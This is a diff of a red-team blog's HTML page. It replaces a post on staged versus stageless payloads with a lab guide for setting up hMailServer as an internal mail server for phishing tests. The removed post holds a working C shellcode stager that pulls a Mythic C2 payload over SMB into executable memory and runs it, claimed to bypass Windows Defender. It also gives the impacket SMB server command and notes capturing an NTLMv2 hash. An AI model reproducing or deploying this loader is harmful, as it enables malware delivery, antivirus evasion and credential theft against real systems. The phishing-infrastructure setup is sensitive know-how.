@@ -10,24 +10,24 @@
     <meta name="generator" content="Retype 3.11.0">
 
     <!-- Primary Meta Tags -->
-    <title>Staging vs Stageless payloads - Which one is Better?</title>
-    <meta name="title" content="Staging vs Stageless payloads - Which one is Better?">
-    <meta name="description" content="In this documentation, we will explore the differences between staged and stageless payloads. In my recent video, I demonstrated how to use the ">
+    <title>Setting up hMailServer as internal mail server</title>
+    <meta name="title" content="Setting up hMailServer as internal mail server">
+    <meta name="description" content="Did you ever wanted to have an internal mail server so you can setup and test your Phishing infrastructure? I got you here!">
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://lsecqt.github.io/Red-Teaming-Army/malware-development/staging-vs-stageless-payloads-what-is-better/">
+    <link rel="canonical" href="https://lsecqt.github.io/Red-Teaming-Army/infrastructure/setting-up-hmailserver-as-internal-mail-server/">
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://lsecqt.github.io/Red-Teaming-Army/malware-development/staging-vs-stageless-payloads-what-is-better/">
-    <meta property="og:title" content="Staging vs Stageless payloads - Which one is Better?">
-    <meta property="og:description" content="In this documentation, we will explore the differences between staged and stageless payloads. In my recent video, I demonstrated how to use the ">
+    <meta property="og:url" content="https://lsecqt.github.io/Red-Teaming-Army/infrastructure/setting-up-hmailserver-as-internal-mail-server/">
+    <meta property="og:title" content="Setting up hMailServer as internal mail server">
+    <meta property="og:description" content="Did you ever wanted to have an internal mail server so you can setup and test your Phishing infrastructure? I got you here!">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://lsecqt.github.io/Red-Teaming-Army/malware-development/staging-vs-stageless-payloads-what-is-better/">
-    <meta property="twitter:title" content="Staging vs Stageless payloads - Which one is Better?">
-    <meta property="twitter:description" content="In this documentation, we will explore the differences between staged and stageless payloads. In my recent video, I demonstrated how to use the ">
+    <meta property="twitter:url" content="https://lsecqt.github.io/Red-Teaming-Army/infrastructure/setting-up-hmailserver-as-internal-mail-server/">
+    <meta property="twitter:title" content="Setting up hMailServer as internal mail server">
+    <meta property="twitter:description" content="Did you ever wanted to have an internal mail server so you can setup and test your Phishing infrastructure? I got you here!">
 
     <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
@@ -37,7 +37,6 @@
     <script data-cfasync="false" src="../../resources/js/config.js?v=3.11.0.806863195012" data-turbo-eval="false" defer></script>
     <script data-cfasync="false" src="../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
     <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.11.0.806863195012" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.11.0.806863195012" defer></script>
 </head>
 <body>
     <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
@@ -320,21 +319,21 @@
                                 <!-- Rendered if sidebar right is enabled -->
                                 <div id="retype-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
-<doc-anchor-target id="staging-vs-stageless-payloads---which-one-is-better" class="break-words">
+<doc-anchor-target id="setting-up-hmailserver-as-internal-mail-server" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#staging-vs-stageless-payloads---which-one-is-better">#</doc-anchor-trigger>
-        <span>Staging vs Stageless payloads - Which one is Better?</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#setting-up-hmailserver-as-internal-mail-server">#</doc-anchor-trigger>
+        <span>Setting up hMailServer as internal mail server</span>
     </h1>
 </doc-anchor-target>
-<doc-anchor-target id="intro">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#intro">#</doc-anchor-trigger>
-        <span>Intro</span>
-    </h2>
-</doc-anchor-target>
-<p>In this documentation, we will explore the differences between staged and stageless payloads. In my recent video, I demonstrated how to use the <strong>Mythic C2 framework</strong> to successfully bypass <strong>Windows Defender</strong> — not through obfuscation or encryption, but purely by leveraging <strong>payload staging over SMB</strong>.</p>
-<p><span class="docs-emoji">&#x1F4FA;</span> <strong>Watch the full video here</strong>: <a href="https://youtu.be/CSt5wcvNjBU">https://youtu.be/CSt5wcvNjBU</a></p>
-<p>Before diving deeper into this topic, make sure to join my <a href="https://discord.gg/bgSpdheEgu">Discord</a> where we share experience, knowledge and doing CTFs together.</p>
+<p>Did you ever wanted to have an internal mail server so you can setup and test your Phishing infrastructure? I got you here!</p>
+<p>If you prefer the video version of this documentation, including live debugging, feel welcomed:</p>
+<p>
+<figure>
+    <div class="relative w-full mb-6 overflow-hidden pt-9/16">
+        <iframe class="w-full h-full border-0 absolute inset-0" src="https://www.youtube.com/embed/_5w0AmwQBzI" allowfullscreen></iframe>
+    </div>
+</figure>
+</p>
 <div class="flex mb-6">
     <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-primary"></div>
     <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
@@ -348,106 +347,25 @@
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-<p>If you have further appreciation for my work, don&#x27;t hesitate to become my <a href="https://www.patreon.com/Lsecqt">Patreon</a>! This way, you help the Red Teaming Army grow, while getting access to private tools such as the ShadowBurn packer.</p>
+<p>Important:
+Special thanks to all of my Patreon supporters.
+By supporting my work on <a href="https://www.patreon.com/Lsecqt">Patreon</a> you get access to internal documentation, private tools and videos.</p>
         </div>
     </div>
 </div>
-<doc-anchor-target id="what-is-a-stageless-payload">
+<doc-anchor-target id="installing-hmailserver">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#what-is-a-stageless-payload">#</doc-anchor-trigger>
-        <span>What is a Stageless Payload?</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#installing-hmailserver">#</doc-anchor-trigger>
+        <span>Installing hMailServer</span>
     </h2>
 </doc-anchor-target>
-<p>A <strong>stageless payload</strong> is a single, self-contained binary or script that includes the entire functionality of the final payload at once. When executed, it immediately initiates a connection back to the C2 (Command and Control) server without requiring any additional downloads or secondary stages.</p>
-<p><strong>Characteristics:</strong></p>
-<ul>
-<li>Contains both the loader and full payload logic.</li>
-<li>Easier to detect by security tools due to its size and complexity.</li>
-<li>Useful when staging isn&#x27;t possible (e.g., no or restricted network access).</li>
-<li>Requires more effort to obfuscate and hide in memory.</li>
-</ul>
+<p>My environment looks like this:</p>
 <p><figure class="content-center">
-    <img src="../../attachments/pasted-image-20250723185040.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <img src="../../attachments/pasted-image-20250726190910.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<doc-anchor-target id="what-is-a-staged-payload">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#what-is-a-staged-payload">#</doc-anchor-trigger>
-        <span>What is a Staged Payload?</span>
-    </h2>
-</doc-anchor-target>
-<p>A <strong>staged payload</strong> breaks the delivery into two or more parts. The initial stage (the stager) is small and lightweight — its only job is to download or retrieve the second stage (the full payload) from a specified location (e.g., an SMB server, HTTP server, etc.).</p>
-<p><strong>Characteristics:</strong></p>
-<ul>
-<li>Smaller initial binary, making it easier to deliver and evade defenses.</li>
-<li>The second stage can be dynamically fetched or built in memory.</li>
-<li>More modular and flexible for C2 communications.</li>
-<li>Detection can be bypassed by isolating or encrypting the second stage.</li>
-</ul>
-<p><figure class="content-center">
-    <img src="../../attachments/pasted-image-20250723185054.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption"></figcaption>
-</figure>
-</p>
-<doc-anchor-target id="demo">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#demo">#</doc-anchor-trigger>
-        <span>Demo</span>
-    </h2>
-</doc-anchor-target>
-<p>This section contains the live demonstration and technical walkthrough of the technique. It includes code snippets, configurations, and output logs relevant to staging payloads over SMB using Mythic C2.</p>
-<p>During the demo I used Mythic C2 (<a href="https://github.com/its-a-feature/Mythic">https://github.com/its-a-feature/Mythic</a>) but the technique is applicable and recommended for any C2 framework.</p>
-<p>The code was compiled from my Offensive CPP Repository:</p>
-<ul>
-<li><p>SMB Staging code: <a href="https://github.com/lsecqt/OffensiveCpp/blob/main/Staging%20Techniques/SMB_Stage.c">https://github.com/lsecqt/OffensiveCpp/blob/main/Staging%20Techniques/SMB_Stage.c</a></p>
-</li>
-<li><p>Direct Pointer Shellcode Execution Blogpost: <a href="https://lsecqt.github.io/Red-Teaming-Army/malware-development/leveraging-the-direct-pointer-a-stealthy-maneuver-in-evasion-tactics/">https://lsecqt.github.io/Red-Teaming-Army/malware-development/leveraging-the-direct-pointer-a-stealthy-maneuver-in-evasion-tactics/</a></p>
-</li>
-</ul>
-<p>During the video, I created the following code:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-c"><code v-pre class="language-c">#include &lt;windows.h&gt;
-#include &lt;stdio.h&gt;
-
-unsigned char buf[2120150] = &quot;&quot;;
-
-void readBin(const char* fileName) {
-	FILE* file;
-	DWORD file_length;
-
-	HANDLE hFile = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (hFile == NULL)
-	{
-		printf(&quot;Error opening file: %d\n&quot;, GetLastError());
-		exit(-99);
-	}
-
-	BOOL rez = ReadFile(hFile, &amp;buf, 2120150, NULL, NULL);
-	if (rez == FALSE)
-	{
-		printf(&quot;Error reading file: %d\n&quot;, GetLastError());
-		exit(-98);
-	}
-}
-
-int main()
-{
-	LPVOID pAddr = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	readBin(&quot;\\\\192.168.0.185\\share\\apollo.bin&quot;);
-	memcpy(pAddr, buf, sizeof(buf));
-	((void(*)())pAddr)();
-
-}</code></pre>
-</doc-codeblock></div>
-<p>Here is important to note the size of <code v-pre>unsigned char buf[2120150]</code>. The <code v-pre>2120150</code> is the size of the payload generated from Mythic C2. If you do <code v-pre>ls -l</code> you can note the size of the file and this is the same size you need here.</p>
-<p>Also, the size must be adjusted in here:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-c"><code v-pre class="language-c">BOOL rez = ReadFile(hFile, &amp;buf, 2120150, NULL, NULL);</code></pre>
-</doc-codeblock></div>
-<p>Usually I would go for dynamic memory allocation but the point was to showcase the staging.</p>
-<hr>
-<p>Next we need to setup the server side. Since we are going to stage over SMB, <code v-pre>impacket-smbserver</code> can do the job perfect for us.</p>
+<p>Here, the <code v-pre>lsec.local</code> domain is inside a dedicated Active Directory and network managed by the PFSense firewall and yes, everything is virtualized from the <code v-pre>PC</code>. I did not want to shoot up a new server just for mail purposes (mainly because of resources) but rather use one of the DCs. In this case, <code v-pre>DC01</code>.</p>
 <div class="flex mb-6">
     <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-primary"></div>
     <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
@@ -461,73 +379,80 @@ int main()
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-<p>I will not go over setting up Mythic C2 as its already explained 
-<div class="mb-6 px-5 py-4 flex justify-between relative border border-base-border hover:border-base-border-hover rounded transition-colors duration-150">
-    <div class="flex items-center text-base-500">
-        <span class="inline-block mb-px">
-            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" role="presentation" fill="currentColor"><path fill="none" d="M0 0h24v24H0z"/><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z"/></svg>
-        </span>
-        <span class="inline-block font-medium ml-2">here</span>
-    </div>
-    <div class="flex items-center text-xs text-gray-400 dark:text-dark-400">
-        <span>/infrastructure/setting20up20mythic20c2/setting20up20mythic20c2.md</span>
-    </div>
-    <a href="/infrastructure/setting20up20mythic20c2/setting20up20mythic20c2.md" class="absolute block inset-0"></a>
-</div>
-</p>
+<p>The setup I will provided is okay for testing and local labs. This is not a setup you should go for on production environment. The whole idea is to easily setup a server from which we can later send emails and phishing campaigns!</p>
         </div>
     </div>
 </div>
-<p>To launch the SMB server we can do:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-bash"><code v-pre class="language-bash">impacket-smbserver &lt;sharename&gt; &lt;sharepath&gt; -ts -debug -smb2support</code></pre>
-</doc-codeblock></div>
-<p>In our case I am using the CWD (Current Working Directory):</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-bash"><code v-pre class="language-bash">impacket-smbserver share . -ts -debug -smb2support</code></pre>
-</doc-codeblock></div>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-primary"></div>
-    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-callout-primary" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
-                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
-                    <path fill="none" d="M0 0h24v24H0z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-<p><code v-pre>&lt;sharename&gt;</code> must be the same as the one specific here:
-<code v-pre>readBin(&quot;\\\\192.168.0.185\\share\\apollo.bin&quot;);</code></p>
-        </div>
-    </div>
-</div>
+<p>So first things first, lets download hMailServer: <a href="https://www.hmailserver.com/download">https://www.hmailserver.com/download</a></p>
+<p>It does not matter where you will download it. The installation steps are super trivial (next -&gt; next -&gt; finish). By default, hMailServer will be installed in <code v-pre>C:\\Program Files(x86\\hMailServer</code></p>
 <p><figure class="content-center">
-    <img src="../../attachments/pasted-image-20250723185230.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <img src="../../attachments/pasted-image-20250726191208.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
+<p>The next step is important if you want to use a dedicated database for it, however I went for the first option because of simplicity. This will setup a small database onto the DC itself, which hMailServer will constantly use.</p>
 <p><figure class="content-center">
-    <img src="../../attachments/pasted-image-20250723185241.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <img src="../../attachments/pasted-image-20250726191300.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<p>C2 Callback came immediate while Defender was turned on.</p>
+<p>Then, you need to setup your password for accessing the hMailServer admin console:</p>
 <p><figure class="content-center">
-    <img src="../../attachments/pasted-image-20250723185255.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <img src="../../attachments/pasted-image-20250726191351.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
+<p>And then you are done! If everything went fine (and I am sure it will) you should see this:</p>
 <p><figure class="content-center">
-    <img src="../../attachments/pasted-image-20250723185304.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <img src="../../attachments/pasted-image-20250726191422.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<p>Additionally, we also received the NTLMv2 hash of the user because of the SMB communication.</p>
+<p>Here, you can edit the default <code v-pre>localhost</code> connection or add a new one. I used the <code v-pre>DC01</code> as a hostname since this is the real hostname of my Domain Controller:</p>
 <p><figure class="content-center">
-    <img src="../../attachments/pasted-image-20250723185420.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <img src="../../attachments/pasted-image-20250726191445.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>After you login to the console, you should configure a domain. My internal AD domain is called <code v-pre>lsec.local</code> so I will use the same name here:</p>
+<p><figure class="content-center">
+    <img src="../../attachments/pasted-image-20250726191544.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>After you add your domain, on the left pane, you should see the <code v-pre>Accounts</code> tab. From there we can either add a local mail account or use present AD account. I found hMailServer to be extremely easy when it comes to account creation and authorization concepts:</p>
+<p><figure class="content-center">
+    <img src="../../attachments/pasted-image-20250726191634.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Here, in order to add an AD account, simply right click onto the Accounts tab -&gt; Add AD account:</p>
+<p><figure class="content-center">
+    <img src="../../attachments/pasted-image-20250726192027.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Then simply specify your Domain and the corresponding user account:</p>
+<p><figure class="content-center">
+    <img src="../../attachments/pasted-image-20250726192100.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>After this step, it is recommended to go to your DNS settings (on the DC) and add an MX record for your mail server:</p>
+<p><figure class="content-center">
+    <img src="../../attachments/pasted-image-20250726191750.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="installing-email-client">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#installing-email-client">#</doc-anchor-trigger>
+        <span>Installing Email Client</span>
+    </h2>
+</doc-anchor-target>
+<p>For the purpose of this demo, I use ThunderBird because of its simplicity, but feel free to improvise. You can download ThunderBird from here: <a href="https://www.thunderbird.net/en-US/thunderbird/all/">https://www.thunderbird.net/en-US/thunderbird/all/</a> and it can run on any platform. Again, the installation of ThunderBird is trivial. After installing, you can then try to connect using the local or AD account you created during the previous steps:</p>
+<p><figure class="content-center">
+    <img src="../../attachments/pasted-image-20250726192718.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -544,10 +469,46 @@ int main()
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-<p>This is demonstration only for staging technique. Even though it bypassed Defender do no think it is enough. Malware development is a combination of techniques!</p>
+<p>Since you already added the MX record up to this point, the client machine should automatically know where to bind to. Missing the DNS steps might cause issues.</p>
         </div>
     </div>
 </div>
+<p>If you are unable to connect using your mail client and see something like this:</p>
+<p><figure class="content-center">
+    <img src="../../attachments/pasted-image-20250726191911.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Then its highly possible that you are auto-blocked from the hMailServer. To resolve it, navigate to hMailServer admin console -&gt; Settings -&gt; Advanced -&gt; IP Ranges. There you will see if there is a lockout and you can simply delete it:</p>
+<p><figure class="content-center">
+    <img src="../../attachments/pasted-image-20250726192258.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>It is also advised to create a new IP Ranges rule to allow emails from specific hosts or subnets:</p>
+<p><figure class="content-center">
+    <img src="../../attachments/pasted-image-20250726192339.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Now to test the email server and clients, I will use my kali and the <code v-pre>sendemail</code> utility. Ideally for future phishing campaigns I will setup GoPhish (<a href="https://github.com/gophish/gophish">https://github.com/gophish/gophish</a>) to handle that, but here we are not yet talking about phishing, but rather the infrastructural perspective.</p>
+<p>In order to send emails from <code v-pre>sendemail</code>, you can use the following snippet:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">sendemail -f &lt;from@domain.com&gt; -t &lt;to@domain.com&gt; -s &lt;DomainServer IP / DNS&gt; -xu &lt;username&gt; -xp &lt;password&gt;</code></pre>
+</doc-codeblock></div>
+<p><figure class="content-center">
+    <img src="../../attachments/pasted-image-20250726193039.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>And finally, we can send / receive emails:</p>
+<p><figure class="content-center">
+    <img src="../../attachments/pasted-image-20250726193016.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Hope this was useful, if so consider a <a href="https://www.youtube.com/@Lsecqt">sub</a> or a <a href="https://www.patreon.com/c/Lsecqt">support</a></p>
+<p>Once again, special thanks to all of my Patreons!</p>
 
                                 
                                 <!-- Required only on API pages -->
@@ -557,20 +518,20 @@ int main()
                             
                                 <nav id="retype-nextprev" class="print:hidden flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../malware-development/malware-development-with-c-basic-persistence/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../c2/utilizing-discord-as-c2-traffic-broker/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
                                                 <span class="block text-xs font-normal text-base-text-muted">Previous</span>
-                                                <span class="block mt-1">Malware Development with C - Establishing Persistence</span>
+                                                <span class="block mt-1">Utilizing Discord as C​2 Traffic Broker</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../malware-development/the-most-powerful-malware-analysis-tool-you-need-in-2025/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../infrastructure/setting-up-mythic-c2/">
                                             <span>
                                                 <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
-                                                <span class="block mt-1">The Most Powerful Malware Analysis Tool You NEED in 2025</span>
+                                                <span class="block mt-1">Setting up Mythic C​2</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                         </a>
@@ -614,6 +575,6 @@ int main()
 
     <div id="retype-overlay-target"></div>
 
-    <script data-cfasync="false">window.__DOCS__ = { "title": "Staging vs Stageless payloads - Which one is Better?", level: 2, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Setting up hMailServer as internal mail server", level: 2, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
 </html>
